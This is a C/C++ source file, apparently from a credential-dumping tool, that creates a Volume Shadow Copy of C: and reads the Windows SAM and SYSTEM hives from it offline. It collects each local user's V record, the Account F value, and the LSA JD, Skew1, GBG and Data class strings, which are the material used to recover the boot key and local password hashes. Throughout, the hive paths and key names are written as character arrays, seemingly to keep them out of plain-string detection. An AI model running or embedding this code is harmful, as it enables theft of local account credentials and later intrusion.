// Peter Gabaldon. https://pgj11.com/.
// Perform a Shadow Snapshot to read SAM and SYSTEM
// from this newly created SS instead of reading them from the registry

// Using Offline Registry library, Offreg.dll, for parsing the Registry from the REGF-formatted SAM and SYSTEM files

// https://github.com/microsoft/Windows-classic-samples/blob/main/Samples/Win7Samples/winbase/vss/vshadow/shadow.cpp
// https://github.com/PeterUpfold/ShadowDuplicator
// https://learn.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-reference
// 
// Special mention to ShadowDuplicator from Peter Upfold because I took some much code from it to implement the shadow copy method and get SYSTEM and SAM from it
// https://github.com/PeterUpfold
// 

#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>

#include "include/shadowMethod.h"
#include "include/ntdll.h"
#include "include/offreg.h"

static HRESULT WaitAndReleaseVssAsync(IVssAsync** vssAsync) {
	if (vssAsync == NULL || *vssAsync == NULL) {
		DebugPrintf("VSS async wait received a NULL async pointer\n");
		return E_POINTER;
	}

	HRESULT result = S_OK;
	HRESULT asyncResult = VSS_S_ASYNC_PENDING;

	DebugPrintf("Waiting for VSS async operation to finish\n");
	while (asyncResult == VSS_S_ASYNC_PENDING) {
		Sleep(SLEEP_VSS_SYNC);
		result = (*vssAsync)->QueryStatus(&asyncResult, NULL);
		DebugPrintf("VSS QueryStatus returned 0x%08lX; async status: 0x%08lX\n", result, asyncResult);
		if (FAILED(result)) {
			break;
		}
	}

	(*vssAsync)->Release();
	*vssAsync = NULL;

	if (FAILED(result)) {
		DebugPrintf("VSS async wait failed with HRESULT 0x%08lX\n", result);
		return result;
	}

	if (asyncResult == VSS_S_ASYNC_FINISHED) {
		DebugPrintf("VSS async operation finished successfully\n");
		return S_OK;
	}

	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
		DebugPrintf("VSS async operation was cancelled\n");
		return HRESULT_FROM_WIN32(ERROR_CANCELLED);
	}

	DebugPrintf("VSS async operation finished with non-success status 0x%08lX\n", asyncResult);
	return asyncResult;
}

BOOL createSS(WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)], WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)]) {
	HRESULT result = E_FAIL;
	int strResult;
	BOOL success = FALSE;
	BOOL comInitialized = FALSE;
	BOOL snapshotPropInitialized = FALSE;
	IVssBackupComponents* backupComponents = NULL;
	IVssAsync* vssAsync = NULL;
	VSS_ID snapshotSetId = GUID_NULL;
	VSS_ID snapshotId = GUID_NULL;
	VSS_SNAPSHOT_PROP snapshotProp{};
	WCHAR auxSAM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'A',L'M', L'\0' };
	WCHAR auxSYSTEM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M', L'\0' };

	// For now, we presuppose C:

	// Not necessary right now. Later, when using args is better to use GetVolumePathNameW(); before GetVolumeNameForVolumeMountPointW

	DebugPrintf("Creating VSS shadow snapshot for C:\\\n");
	WCHAR volumeName[MAX_PATH] = {};
	if (!GetVolumeNameForVolumeMountPointW(L"C:\\", volumeName, MAX_PATH)) {
		DebugPrintf("GetVolumeNameForVolumeMountPointW(C:\\) failed with Win32 error %lu\n", GetLastError());
		return FALSE;
	}
	DebugPrintWideString("Resolved volume name", volumeName);

	// Init COM
	result = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	DebugPrintf("CoInitializeEx returned 0x%08lX\n", result);

	if (FAILED(result)) {
		goto cleanup;
	}
	comInitialized = TRUE;

	result = CreateVssBackupComponents(&backupComponents);
	DebugPrintf("CreateVssBackupComponents returned 0x%08lX\n", result);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->InitializeForBackup();
	DebugPrintf("InitializeForBackup returned 0x%08lX\n", result);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->SetContext(VSS_CTX_CLIENT_ACCESSIBLE);
	DebugPrintf("SetContext(VSS_CTX_CLIENT_ACCESSIBLE) returned 0x%08lX\n", result);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->StartSnapshotSet(&snapshotSetId);
	DebugPrintf("StartSnapshotSet returned 0x%08lX\n", result);
	DebugPrintGuid("Snapshot set ID", snapshotSetId);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->AddToSnapshotSet(volumeName, GUID_NULL, &snapshotId);
	DebugPrintf("AddToSnapshotSet returned 0x%08lX\n", result);
	DebugPrintGuid("Snapshot ID", snapshotId);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->DoSnapshotSet(&vssAsync);
	DebugPrintf("DoSnapshotSet returned 0x%08lX\n", result);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = WaitAndReleaseVssAsync(&vssAsync);
	DebugPrintf("WaitAndReleaseVssAsync returned 0x%08lX\n", result);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->GetSnapshotProperties(snapshotId, &snapshotProp);
	DebugPrintf("GetSnapshotProperties returned 0x%08lX\n", result);

	if (FAILED(result)) {
		goto cleanup;
	}
	snapshotPropInitialized = TRUE;
	DebugPrintWideString("Snapshot device object", snapshotProp.m_pwszSnapshotDeviceObject);

	// Perform the copy from SS

	// SAM
	strResult = swprintf(sourcePathFileSAM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, auxSAM);
	if (strResult < 0) {
		goto cleanup;
	}
	// SYSTEM
	strResult = swprintf(sourcePathFileSYSTEM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, auxSYSTEM);
	if (strResult < 0) {
		goto cleanup;
	}
	DebugPrintWideString("Shadow SAM hive path", sourcePathFileSAM);
	DebugPrintWideString("Shadow SYSTEM hive path", sourcePathFileSYSTEM);

	success = TRUE;

cleanup:
	if (!success) {
		DebugPrintf("Shadow snapshot creation failed; last HRESULT 0x%08lX\n", result);
	}

	if (vssAsync != NULL) {
		vssAsync->Release();
		vssAsync = NULL;
	}

	if (snapshotPropInitialized) {
		VssFreeSnapshotProperties(&snapshotProp);
	}

	if (backupComponents != NULL) {
		backupComponents->Release();
		backupComponents = NULL;
	}

	if (comInitialized) {
		CoUninitialize();
	}

	return success;
}

void getSAMfromRegf(PSAM samRegEntries[], PULONG size, WCHAR SAMPath[MAX_PATH], WCHAR SYSTEMPath[MAX_PATH]) {
	ORHKEY subKeyUsers;
	ORHKEY subKeyAccount;
	ORHKEY subKeyUser;
	ULONG lengthBuff;
	DWORD numberSubkeysKey;
	DWORD numberValuesSubkeysV;
	DWORD numberValuesSubkeysF;
	WCHAR nameSubkeyKey[MAX_PATH] = {};
	WCHAR nameValueSubkeyV[MAX_PATH] = {};
	WCHAR nameValueSubkeyF[MAX_PATH] = {};
	DWORD maxLenOfNames;
	ULONG nEntries = 0;
	PSAM sams[MAX_SAM_ENTRIES] = {};
	ORHKEY samHive = NULL;

	// Some funcs need a pointer to a DWORD so cannot use macro
	DWORD lenRead = MAX_PATH;

	DWORD ret;

	DebugPrintf("Collecting SAM entries from offline hives\n");
	if (samRegEntries == NULL) {
		DebugPrintf("Offline SAM output buffer is NULL; probing entry count and byte size\n");
	}
	DebugPrintWideString("Offline SAM hive path", SAMPath);
	DebugPrintWideString("Offline SYSTEM hive path", SYSTEMPath);

	ret = OROpenHive(SAMPath, &samHive);
	DebugPrintf("OROpenHive(SAM) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	// Open SAM\Account\Domains\USers

	ret = OROpenKey(samHive, L"SAM", &subKeyUsers);
	DebugPrintf("OROpenKey(SAM) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyUsers, L"Domains", &subKeyUsers);
	DebugPrintf("OROpenKey(SAM\\Domains) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyUsers, L"Account", &subKeyUsers);
	DebugPrintf("OROpenKey(SAM\\Domains\\Account) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyUsers, L"Users", &subKeyUsers);
	DebugPrintf("OROpenKey(SAM\\Domains\\Account\\Users) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	// Open SAM\Domains\Account

	ret = OROpenKey(samHive, L"SAM", &subKeyAccount);
	DebugPrintf("OROpenKey(SAM for Account F) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyAccount, L"Domains", &subKeyAccount);
	DebugPrintf("OROpenKey(SAM\\Domains for Account F) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyAccount, L"Account", &subKeyAccount);
	DebugPrintf("OROpenKey(SAM\\Domains\\Account for F) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}


	ret = ORQueryInfoKey(subKeyUsers, NULL, NULL, &numberSubkeysKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	DebugPrintf("ORQueryInfoKey(Users) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}
	DebugPrintf("Offline SAM Users subkeys found: %lu; processing at most %d\n", numberSubkeysKey, MAX_SAM_ENTRIES);


	for (ULONG i = 0; i < numberSubkeysKey && i < MAX_SAM_ENTRIES; i++) {
		maxLenOfNames = MAX_KEY_LENGTH;

		lenRead = MAX_PATH;
		ret = OREnumKey(subKeyUsers, i, nameSubkeyKey, &lenRead, NULL, NULL, NULL);
		DebugPrintf("OREnumKey(Users[%lu]) returned 0x%08lX; name chars read: %lu\n", i, ret, lenRead);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}
		DebugPrintWideString("Offline SAM Users subkey name", nameSubkeyKey);

		if (wcsncmp(L"00", nameSubkeyKey, wcslen(L"00")) == 0) {
			DebugPrintWideString("Processing offline RID key", nameSubkeyKey);
			ret = OROpenKey(subKeyUsers, nameSubkeyKey, &subKeyUser);
			DebugPrintf("OROpenKey(offline RID key) returned 0x%08lX\n", ret);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			ret = ORQueryInfoKey(subKeyUser, NULL, NULL, NULL, NULL, NULL, &numberValuesSubkeysV, NULL, NULL, NULL, NULL);
			DebugPrintf("ORQueryInfoKey(offline RID values) returned 0x%08lX\n", ret);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}
			DebugPrintf("Offline RID value count: %lu\n", numberValuesSubkeysV);

			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAM));
			wcscpy_s(sam->rid, MAX_KEY_LENGTH, nameSubkeyKey);
			DebugPrintWideString("Offline RID selected for SAM entry", sam->rid);

			// TODO
			getClassesfromRegf(sam, SYSTEMPath);
			DebugPrintWideString("Offline SYSTEM LSA class material collected for RID", sam->classes);

			for (ULONG j = 0; j < numberValuesSubkeysV; j++) {
				lenRead = MAX_PATH;
				ret = OREnumValue(subKeyUser, j, nameValueSubkeyV, &lenRead, NULL, NULL, NULL);
				DebugPrintf("OREnumValue(offline RID value[%lu]) returned 0x%08lX; name chars read: %lu\n", j, ret, lenRead);

				if (!NT_SUCCESS(ret)) {
					exit(ret);
				}
				DebugPrintWideString("Offline RID value name", nameValueSubkeyV);

				if (wcsncmp(nameValueSubkeyV, L"V", wcslen(nameValueSubkeyV)) == 0) {
					lenRead = MAX_KEY_VALUE_LENGTH;
					ret = ORGetValue(subKeyUser, NULL, nameValueSubkeyV, NULL, sam->v, &lenRead);
					sam->vLen = lenRead;
					DebugPrintf("ORGetValue(offline V) returned 0x%08lX; length: %lu bytes\n", ret, sam->vLen);
					DebugPrintHexPreview("Offline SAM V value preview", sam->v, sam->vLen, 64);
				}
			}
			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			ret = ORQueryInfoKey(subKeyAccount, NULL, NULL, NULL, NULL, NULL, &numberValuesSubkeysF, NULL, NULL, NULL, NULL);
			DebugPrintf("ORQueryInfoKey(offline Account values) returned 0x%08lX\n", ret);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}
			DebugPrintf("Offline Account value count: %lu\n", numberValuesSubkeysF);

			for (ULONG j = 0; j < numberValuesSubkeysF; j++) {
				lenRead = MAX_PATH;
				ret = OREnumValue(subKeyAccount, j, nameValueSubkeyF, &lenRead, NULL, NULL, NULL);
				DebugPrintf("OREnumValue(offline Account value[%lu]) returned 0x%08lX; name chars read: %lu\n", j, ret, lenRead);

				if (!NT_SUCCESS(ret)) {
					exit(ret);
				}
				DebugPrintWideString("Offline Account value name", nameValueSubkeyF);

				if (wcsncmp(nameValueSubkeyF, L"F", wcslen(nameValueSubkeyF)) == 0) {
					lenRead = MAX_KEY_VALUE_LENGTH;
					ret = ORGetValue(subKeyAccount, NULL, nameValueSubkeyF, NULL, sam->f, &lenRead);
					sam->fLen = lenRead;
					DebugPrintf("ORGetValue(offline F) returned 0x%08lX; length: %lu bytes\n", ret, sam->fLen);
					DebugPrintHexPreview("Offline SAM F value preview", sam->f, sam->fLen, 64);
				}
			}

			sams[nEntries] = sam;
			nEntries++;
			DebugPrintf("Stored offline SAM entry index %lu\n", nEntries - 1);
			ORCloseKey(subKeyUser);
		}
	}
	ORCloseKey(subKeyUsers);
	ORCloseKey(subKeyAccount);
	ORCloseHive(samHive);

	ULONG lenRet = nEntries * sizeof(SAM);
	CopyMemory(size, &lenRet, sizeof(ULONG));
	DebugPrintf("Offline SAM collection completed: %lu entries, %lu bytes\n", nEntries, lenRet);

	if (samRegEntries != NULL) {
		for (int i = 0; i < nEntries; i++) {
			samRegEntries[i] = sams[i];
			//HeapFree(GetProcessHeap(), 0, sams[i]);
		}
	}

	return;
}

void getClassesfromRegf(PSAM samRegEntry, WCHAR SYSTEMPath[MAX_PATH]) {
	WCHAR sJD[] = { L'J',L'D', L'\0' };
	WCHAR sSkew1[] = { L'S',L'k',L'e',L'w',L'1', L'\0' };
	WCHAR sGBG[] = { L'G',L'B',L'G', L'\0' };
	WCHAR sData[] = { L'D',L'a',L't',L'a', L'\0' };

	PWCHAR sAll[4] = { sJD, sSkew1, sGBG, sData };

	WCHAR resul[MAX_KEY_VALUE_LENGTH] = L"\0";
	WCHAR keyClass[MAX_KEY_VALUE_LENGTH] = {};
	ORHKEY systemHive = NULL;

	ORHKEY key;
	ORHKEY subKey;
	DWORD lenRead;

	DWORD ret;

	DebugPrintWideString("Opening offline SYSTEM hive for LSA class material", SYSTEMPath);
	ret = OROpenHive(SYSTEMPath, &systemHive);
	DebugPrintf("OROpenHive(SYSTEM) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(systemHive, L"ControlSet001", &key);
	DebugPrintf("OROpenKey(SYSTEM\\ControlSet001) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(key, L"Control", &key);
	DebugPrintf("OROpenKey(SYSTEM\\ControlSet001\\Control) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(key, L"Lsa", &key);
	DebugPrintf("OROpenKey(SYSTEM\\ControlSet001\\Control\\Lsa) returned 0x%08lX\n", ret);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	for (int j = 0; j < 4; j++) {
		DebugPrintWideString("Opening offline SYSTEM LSA class key", sAll[j]);
		ret = OROpenKey(key, sAll[j], &subKey);
		DebugPrintf("OROpenKey(offline SYSTEM LSA class key) returned 0x%08lX\n", ret);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		ZeroMemory(keyClass, sizeof(keyClass));
		lenRead = MAX_KEY_VALUE_LENGTH;
		ret = ORQueryInfoKey(subKey, keyClass, &lenRead, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		DebugPrintf("ORQueryInfoKey(offline SYSTEM LSA class) returned 0x%08lX\n", ret);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		DebugPrintf("Offline SYSTEM LSA class chars read: %lu\n", lenRead);
		DebugPrintWideString("Offline SYSTEM LSA class chunk", keyClass);
		wcsncat_s(resul, MAX_KEY_VALUE_LENGTH, keyClass, _TRUNCATE);
		DebugPrintWideString("Accumulated offline SYSTEM LSA class material", resul);

		ORCloseKey(subKey);
	}
	wcscpy_s(samRegEntry->classes, MAX_KEY_VALUE_LENGTH, resul);
	DebugPrintWideString("Final offline SYSTEM LSA class material", samRegEntry->classes);

	ORCloseKey(key);
	ORCloseHive(systemHive);

	return;
}
